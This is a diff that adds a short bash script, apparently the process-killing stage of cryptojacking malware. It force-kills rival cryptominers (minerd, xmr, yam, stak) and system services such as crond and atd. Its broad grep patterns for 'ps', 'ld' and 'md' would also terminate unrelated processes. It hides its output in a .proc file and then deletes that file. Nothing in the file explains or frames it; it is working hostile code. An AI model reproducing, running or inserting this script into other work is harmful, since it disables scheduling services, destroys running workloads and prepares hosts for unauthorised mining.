@@ -1,0 +1,39 @@
+#!/bin/bash
+pkill -9 crond
+pkill -9 crondc
+pkill -9 crondk
+pkill -9 noCPU
+killall -9 crond >.proc
+killall -9 yam >.proc
+killall -9 minerd >.proc
+killall -9 idle >.proc
+killall -9 md >.proc
+killall -9 mdx >.proc
+killall -9 yam32 >.proc
+killall -9 atd >.proc
+killall -9 xmr >.proc
+killall -9 ld >.proc
+killall -9 ps >.proc
+pkill -9 crond > .proc
+pkill -9 crond
+pkill -9 noCPU
+
+kill -9 `ps x|grep crond|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep yam|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep minerd|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep idle|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep md|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep mdx|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep yam32|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep lib.sh|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep stak|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep atd|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep xmr|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep crondc|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep crondk|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep ld|grep -v grep|awk '{print $1}'`>.proc
+kill -9 `ps x|grep ps|grep -v grep|awk '{print $1}'`>.proc
+pkill -9 crondc
+
+
+rm -rf .proc
